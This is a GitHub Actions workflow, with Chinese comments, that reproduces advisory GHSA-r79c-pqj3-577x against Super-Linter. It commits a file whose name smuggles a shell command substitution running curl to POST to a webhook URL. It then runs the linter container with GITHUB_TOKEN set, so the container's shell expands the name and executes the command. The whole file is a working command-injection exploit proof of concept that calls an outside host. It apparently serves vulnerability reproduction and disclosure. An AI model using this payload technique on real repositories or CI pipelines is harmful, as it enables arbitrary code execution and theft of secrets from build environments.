name: Security Repro - GHSA-r79c-pqj3-577x

on:
  workflow_dispatch:
    inputs:
      target_version:
        description: 'Target version'
        required: true
        default: 'v7'
      webhook_url:
        description: 'Webhook URL'
        required: true
        default: 'https://webhook.site/YOUR-UUID-HERE'

jobs:
  repro-exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: 1. Setup Git & Payload
        run: |
          # 1. 重置 Git 环境 (模拟 PR 状态)
          rm -rf .git
          git init
          git config --global user.email "attacker@example.com"
          git config --global user.name "Attacker"
          
          # 2. 创建基准分支
          echo "safe" > README.md
          git add README.md
          git commit -m "init"
          git branch -m master
          
          # 3. 构造 Payload (环境变量法)
          # 注意：文件名里只有变量名 $H，没有斜杠，所以 touch 不会报错！
          # 我们用单引号包围，防止在当前 Runner Shell 里被展开
          PAYLOAD_NAME='pre$(curl -fsS -X POST $H).md'
          
          echo "Creating file: $PAYLOAD_NAME"
          touch "$PAYLOAD_NAME"
          
          # 4. 提交恶意文件 (必须提交，否则 git diff 看不到)
          git add "$PAYLOAD_NAME"
          git commit -m "add exploit"
          
          # 5. 记录 Commit SHA
          echo "CURRENT_SHA=$(git rev-parse HEAD)" >> $GITHUB_ENV

      - name: 2. Run Super-Linter (Trigger Exploit)
        continue-on-error: true
        run: |
          echo "Testing against: ${{ inputs.target_version }}"
          
          # 这里的 H 变量就是我们传入的 Webhook URL
          # 容器内的 Shell 在处理文件名时会展开 $H
          
          docker run --rm \
            -e RUN_LOCAL=true \
            -e VALIDATE_ALL_CODEBASE=false \
            -e DEFAULT_BRANCH=master \
            -e GITHUB_SHA=${{ env.CURRENT_SHA }} \
            -e GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }} \
            -e H="${{ inputs.webhook_url }}" \
            -v "$(pwd):/tmp/lint" \
            ghcr.io/super-linter/super-linter:${{ inputs.target_version }}
            
      - name: 3. Verify
        run: |
          echo "Done. Please check ${{ inputs.webhook_url }}"
